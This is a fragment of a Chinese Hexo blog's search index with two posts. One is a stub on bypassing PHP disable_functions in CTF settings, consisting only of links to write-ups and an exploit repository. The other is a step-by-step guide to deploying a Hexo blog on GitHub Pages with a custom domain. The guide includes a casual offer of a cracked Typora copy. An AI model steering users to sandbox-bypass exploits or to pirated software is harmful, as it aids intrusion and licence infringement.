    <url>/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过Disable-function"><a href="#绕过Disable-function" class="headerlink" title="绕过Disable_function"></a>绕过Disable_function</h1><p><a href="https://xz.aliyun.com/t/10057">https://xz.aliyun.com/t/10057</a></p><p><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p><p><a href="https://christa.top/details/21/">https://christa.top/details/21/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何搭建一篇博客2024版</title>
    <link href="/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/"/>
    <url>/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/</url>
    
    <content type="html"><![CDATA[<h2 id="一：环境和工具准备："><a href="#一：环境和工具准备：" class="headerlink" title="一：环境和工具准备："></a>一：环境和工具准备：</h2><p>1.系统（Windows10 11）<br>2.Node js<br>3.Git<br>4.hexo<br>5.文本编辑器<br>6.一个Github账号</p><h2 id="二-Node-js的安装："><a href="#二-Node-js的安装：" class="headerlink" title="二.Node js的安装："></a>二.Node js的安装：</h2><p>1.打开Node官网，下载Node js安装程序，下载地址：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a><br>2.下载后安装，安装目录尽量默认，除非你对它非常了解。<br>3.安装完成后，检查是否安装成功。打开cmd窗口，输入：node -v，看到了<br>版本信息，代表安装成功。<br>4.修改下载源。npm下载各种模块，默认是从国外的服务器下载，速度较慢，把它换成国内镜像，打开cmd窗口，运行命令：npm config set registry <a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a></p><p>国内访问 npm 官方源可能会有速度较慢或者不稳定的问题，可以切换到国内镜像源，如淘宝镜像：</p><p>npm config set registry <a href="https://registry.npmmirror.com/">https://registry.npmmirror.com/</a></p><h2 id="三-安装Git："><a href="#三-安装Git：" class="headerlink" title="三.安装Git："></a>三.安装Git：</h2><p>1.进入官网：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a> ，由于官网下载太慢可以通过淘宝的开源镜像下载 网址：<a href="https://registry.npmmirror.com/binary.html?path=git-for-windows/v2.36.1.windows.1/">https://registry.npmmirror.com/binary.html?path=git-for-windows/v2.36.1.windows.1/</a><br>2.下载后傻瓜式安装即可，安装目录可以默认，可以自选。<br>3.在桌面右键，出现Open Git Bash here即代表安装成功。</p><h2 id="四-安装Hexo："><a href="#四-安装Hexo：" class="headerlink" title="四.安装Hexo："></a>四.安装Hexo：</h2><p>1.右键Git Bash输入如下命令安装：npm install -g hexo-cli<br>2.安装完后输入hexo -v验证，出现版本号即代表成功。</p><h2 id="五-Github与仓库的创建"><a href="#五-Github与仓库的创建" class="headerlink" title="五.Github与仓库的创建"></a>五.Github与仓库的创建</h2><p>1.进入官网：<a href="https://github.com/">https://github.com/</a><br>2.点击右上角Sign up进行注册：<br>3.填写自己的邮箱、密码、用户名等信息，然后用邮箱验证即可完成。<br>4.注册完成后，点击右上角+按钮，选择New repository，创建一个名称为用户名.github.io<br>的仓库。</p><p>注意：1.名称必须为你的用户名.github.io,不然会404<br>  2.Description：为描述仓库。（选填）<br>  3.勾选 Initialize this repository with a README 初始化一个 README.md文件。<br>  4.点击 Creat repository 进行创建。</p><h2 id="六-环境配置："><a href="#六-环境配置：" class="headerlink" title="六.环境配置："></a>六.环境配置：</h2><p>1.配置用户名和邮箱：<br><code>git config --global user.name &quot;你的用户名&quot; git config --global user.email &quot;你的邮箱&quot;</code><br>2.通过 <code>git config -l</code>检查是否配置成功，现在git安装及配置全部完成。</p><h2 id="七-连接至Github："><a href="#七-连接至Github：" class="headerlink" title="七.连接至Github："></a>七.连接至Github：</h2><p>1.执行以下命令生成ssh公钥，它用于你的计算机连接Github。<br><code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code></p><p>2.将 SSH KEY 配置到 GitHub<br>进入Github，点击右上角头像，选择settings，进入设置后选择 SSH and GPG keys，<br>名字尽量写英文的，把刚才复制的公钥填到 Key 那一栏。完成后保存。</p><p>3.测试连接，输入以下命令：<br><code>ssh -T git@github.com</code><br>出现连接到账户的提示信息，说明大功告成，现在完成了环境准备工作。</p><h2 id="八-初始化Hexo项目"><a href="#八-初始化Hexo项目" class="headerlink" title="八.初始化Hexo项目"></a>八.初始化Hexo项目</h2><p>1.在你想放博客文件的路径打开GBH，执行下列命令初始化项目。（把blog后面的东西删掉）<br><code>hexo init blog(项目名)</code><br>2.进入blog文件夹，再次右键GBH，输入 <code>npm i</code>安装相关依赖。</p><p>3.安装完成后，blog文件夹内有如下结构：<br>【node_modules】：依赖包<br>【scaffolds】：生成文章的一些模板<br>【source】：用来存放你的文章<br>【themes】：主题<br>【.npmignore】：发布时忽略的文件（可忽略）<br>【_config.landscape.yml】：主题的配置文件<br>【config.yml】：博客的配置文件<br>【package.json】：项目名称、描述、版本、运行和开发等信息</p><p>4.输入hexo s启动项目</p><h2 id="九-更换主题"><a href="#九-更换主题" class="headerlink" title="九.更换主题"></a>九.更换主题</h2><p>github：<a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml</a></p><h2 id="十-页面个性化"><a href="#十-页面个性化" class="headerlink" title="十.页面个性化"></a>十.页面个性化</h2><ol><li>浏览器tab页名称<br>修改根目录下 _config.yml 中的 title 字段。<br>subtitle为副标题<br>description不用填写<br>keywords关键词，可不填写<br>author博客所有者<br>language语言，中国大陆使用zh-CN<br>timezone不用填写</li></ol><p>2.博客导航栏左侧文字<br>blog目录下_config.fluid.yml中的blog_title 字段。</p><p>3.首页正中间的文字<br>blog目录下_config.fluid.yml中的text字段。</p><h2 id="十一-将静态博客挂载到Github-Pages"><a href="#十一-将静态博客挂载到Github-Pages" class="headerlink" title="十一.将静态博客挂载到Github Pages"></a>十一.将静态博客挂载到Github Pages</h2><p>方案一（玄学）</p><p>1.安装 hexo-deployer-git，输入以下命令：<br><code>npm install hexo-deployer-git --save</code><br>2.修改根目录下的 _config.yml，配置 GitHub 相关信息</p><p>deploy:<br>type: git<br>repository: <a href="https://github.com/XXX/XXX.github.io.git">https://github.com/XXX/XXX.github.io.git</a><br>branch: main<br>token: XXXXXXXXXXXXX（要获取）</p><p>repository获取方式为：<br>进入<a href="https://github.com/">https://github.com/</a>,<br>点击右上角三条杠，点击你新建的用户名.github.io的仓库<br>点击中间那个绿色的Code按钮，选择左边的 Local 下面三个选项里选SSH,复制那个链接即可</p><p>其中 token 为 GitHub 的 Personal access tokens，获取方式如下图：<br>token只会出现一次，复制下来妥善保存，如果丢失，则要重新生成。</p><p>部署到Github：<br>先输入hexo clean清除缓存<br>再输入命令<code>hexo g -d</code></p><p>部署完成后等待两分钟，浏览器访问：https:&#x2F;&#x2F;你的GitHub用户名.github.io<br>能正常访问即部署成功。<br>但是很玄学，我上课前还可以，下课试试就不出来了，呜呜呜</p><h2 id="我的方案："><a href="#我的方案：" class="headerlink" title="我的方案："></a>我的方案：</h2><p>1.安装 hexo-deployer-git，输入以下命令：<br><code>npm install hexo-deployer-git --save</code></p><p>2.使用国内镜像源</p><ul><li><p>国内访问 npm 官方源可能会有速度较慢或者不稳定的问题，可以切换到国内镜像源，如淘宝镜像：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">npm config set registry https:<span class="hljs-comment">//registry.npmmirror.com/</span><br></code></pre></td></tr></table></figure></li></ul><p>之后再尝试重新安装依赖：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>3.配置 Hexo 部署到 GitHub Pages</p><p>打开你的 Hexo 项目根目录下的 <code>_config.yml</code> 文件，找到或添加 <code>deploy</code> 配置部分，按照以下示例进行配置：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repository:</span> https:<span class="hljs-comment">//github.com/你的用户名/你的仓库名.github.io.git</span><br><span class="hljs-symbol">  branch:</span> main<br><span class="hljs-symbol">  token:</span> 你的GitHub个人访问令牌<br></code></pre></td></tr></table></figure><p><strong>注意</strong>：</p><ul><li><code>repository</code>：将此项替换为你 GitHub Pages 仓库的地址，格式通常为 <code>https://github.com/你的用户名/你的用户名.github.io.git</code>。</li><li><code>branch</code>：通常为 <code>main</code>，也可能是 <code>master</code>，视你的仓库配置而定。</li><li><code>token</code>：GitHub 的 Personal access token，用于身份验证。你可以在 GitHub 的 <a href="https://github.com/settings/tokens">Personal access tokens</a> 页面生成一个新令牌。</li></ul><p><strong>理缓存并生成部署</strong></p><ul><li><p>在终端中执行以下命令，清理缓存并生成静态文件，然后部署到 GitHub：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo clean<br>hexo <span class="hljs-keyword">generate</span><br>hexo deploy<br></code></pre></td></tr></table></figure></li></ul><p><strong>检查部署</strong></p><ul><li>部署完成后，等待几分钟后访问 <code>https://你的用户名.github.io</code>，查看你的博客是否成功部署。</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先，在本地创建一篇新的文章。你可以使用 Hexo 提供的命令来生成一篇新文章的文件。</p><p><code>hexo new &quot;文章标题&quot;</code></p><p>这将会在 <code>source/_posts/</code> 目录下生成一个 <code>我的新文章.md</code> 文件。</p><h3 id="创建关于页面"><a href="#创建关于页面" class="headerlink" title="创建关于页面"></a>创建关于页面</h3><p>hexo new page about</p><h3 id="配置分类页面"><a href="#配置分类页面" class="headerlink" title="配置分类页面"></a>配置分类页面</h3><p>确保 <code>source/about/index.md</code> 文件中有内容。即使是一个简单的标题和段落也可以：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">关于我</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2024-08-31 12:00:00</span><br><br><span class="hljs-string">这里是关于页面的内容。</span><br></code></pre></td></tr></table></figure><h3 id="创建分类页面"><a href="#创建分类页面" class="headerlink" title="创建分类页面"></a>创建分类页面</h3><p>hexo new page categories</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">title</span>: 关于我 <br><span class="hljs-attribute">date</span>: 2024-08-31 12:00:00 <br><span class="hljs-literal">-</span>-- 这里是关于页面的内容。<br></code></pre></td></tr></table></figure><h3 id="配置分类页面-1"><a href="#配置分类页面-1" class="headerlink" title="配置分类页面"></a>配置分类页面</h3><p>编辑 <code>source/categories/index.md</code> 文件，确保它正确配置为展示所有分类：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: 分类<br>layout: categories<br></code></pre></td></tr></table></figure><h3 id="生成标签页面"><a href="#生成标签页面" class="headerlink" title="生成标签页面"></a>生成标签页面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new page tags<br></code></pre></td></tr></table></figure><h3 id="配置标签页面"><a href="#配置标签页面" class="headerlink" title="配置标签页面"></a>配置标签页面</h3><p>接下来，编辑 <code>source/tags/index.md</code> 文件，以确保它正确显示标签列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: 标签<br>layout: tags<br></code></pre></td></tr></table></figure><p>然后就可以写文件了</p><p>只需要注意前面是像：</p><p>title: 绕过Disable_function<br>date: 2024-08-31 12:47:42<br>categories: CTF-web rce<br>tags: web php       这样的</p><h3 id="三步建立法"><a href="#三步建立法" class="headerlink" title="三步建立法"></a>三步建立法</h3><p>hexo clean  </p><p>hexo generate</p><p>hexo server</p><p>然后在浏览器中访问 <code>http://localhost:4000/about/</code></p><p>什么没有好的md编辑器还要用vs和clion就out了，到224找我，破解的免费typora不用谢</p><p>要将你的Hexo网站与自定义域名 绑定，可以按照以下步骤操作：</p><h3 id="1-配置域名DNS"><a href="#1-配置域名DNS" class="headerlink" title="1. 配置域名DNS"></a>1. <strong>配置域名DNS</strong></h3><p>首先，你需要在你的域名注册商处配置DNS记录，以指向GitHub Pages的服务器。</p><h4 id="添加A记录（如果使用裸域名）"><a href="#添加A记录（如果使用裸域名）" class="headerlink" title="添加A记录（如果使用裸域名）"></a>添加A记录（如果使用裸域名）</h4><ol><li><p>登录到你的域名注册商的管理控制台。</p></li><li><p>找到你的域名 <code>uertnecesshazar.top</code> 的DNS设置页面。</p></li><li><p>添加一条A记录：</p><ul><li><strong>主机名（Host）</strong>：<code>@</code> 或留空</li><li><strong>记录类型（Type）</strong>：<code>A</code></li><li><strong>记录值（Value）</strong>：<code>185.199.108.153</code>, <code>185.199.109.153</code>, <code>185.199.110.153</code>, <code>185.199.111.153</code></li><li><strong>TTL</strong>：使用默认值</li></ul><p>你可以添加四条A记录，分别指向GitHub Pages的IP地址，以确保高可用性。</p></li></ol><h4 id="添加CNAME记录（如果使用带www的域名）"><a href="#添加CNAME记录（如果使用带www的域名）" class="headerlink" title="添加CNAME记录（如果使用带www的域名）"></a>添加CNAME记录（如果使用带www的域名）</h4><p>如果你还想支持 <code>www.uertnecesshazar.top</code> 这样的子域名，你可以添加一条CNAME记录：</p><ol><li><strong>主机名（Host）</strong>：<code>www</code></li><li><strong>记录类型（Type）</strong>：<code>CNAME</code></li><li><strong>记录值（Value）</strong>：<code>theganlove.github.io</code></li><li><strong>TTL</strong>：使用默认值</li></ol><h3 id="2-配置Hexo的CNAME文件"><a href="#2-配置Hexo的CNAME文件" class="headerlink" title="2. 配置Hexo的CNAME文件"></a>2. <strong>配置Hexo的CNAME文件</strong></h3><p>为了让GitHub Pages知道你的网站绑定了自定义域名，你需要在Hexo项目中添加一个 <code>CNAME</code> 文件。</p><ol><li><p><strong>创建CNAME文件</strong>：</p><ul><li>在你的 Hexo 项目的 <code>source</code> 目录中，创建一个名为 <code>CNAME</code> 的文件（无扩展名）。</li></ul></li><li><p><strong>编辑CNAME文件</strong>：</p><ul><li><p>在 <code>CNAME</code> 文件中添加你的自定义域名：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">uertnecesshazar.<span class="hljs-built_in">top</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>保存文件</strong>。</p></li></ol><h3 id="3-重新生成和部署网站"><a href="#3-重新生成和部署网站" class="headerlink" title="3. 重新生成和部署网站"></a>3. <strong>重新生成和部署网站</strong></h3><ol><li><p>生成静态文件：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo <span class="hljs-keyword">generate</span><br></code></pre></td></tr></table></figure></li><li><p>部署到GitHub Pages：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo deploy</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="4-等待DNS生效"><a href="#4-等待DNS生效" class="headerlink" title="4. 等待DNS生效"></a>4. <strong>等待DNS生效</strong></h3><p>DNS更改可能需要几分钟到48小时生效。你可以使用 <code>nslookup</code> 或 <code>dig</code> 工具来检查DNS设置是否正确配置。</p><h3 id="5-访问你的自定义域名"><a href="#5-访问你的自定义域名" class="headerlink" title="5. 访问你的自定义域名"></a>5. <strong>访问你的自定义域名</strong></h3><p>一旦DNS生效，你应该可以通过 <code>http://uertnecesshazar.top</code> 或 <code>https://uertnecesshazar.top</code> 访问你的网站。</p><h3 id="6-配置HTTPS（可选）"><a href="#6-配置HTTPS（可选）" class="headerlink" title="6. 配置HTTPS（可选）"></a>6. <strong>配置HTTPS（可选）</strong></h3><p>GitHub Pages 支持免费的HTTPS证书。如果你使用自定义域名并希望启用HTTPS，请在GitHub仓库的设置中启用HTTPS。</p><ol><li>在你的GitHub仓库页面中，点击 “Settings”。</li><li>向下滚动到 “GitHub Pages” 部分。</li><li>如果选项可用，勾选 “Enforce HTTPS” 选项。</li></ol><p>这将强制所有用户通过HTTPS访问你的网站，确保数据传输的安全性。</p><p>通过以上步骤，你将成功将自定义域名 <code>uertnecesshazar.top</code> 与Hexo网站绑定。如果在这些步骤中遇到任何问题，请随时告诉我！</p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
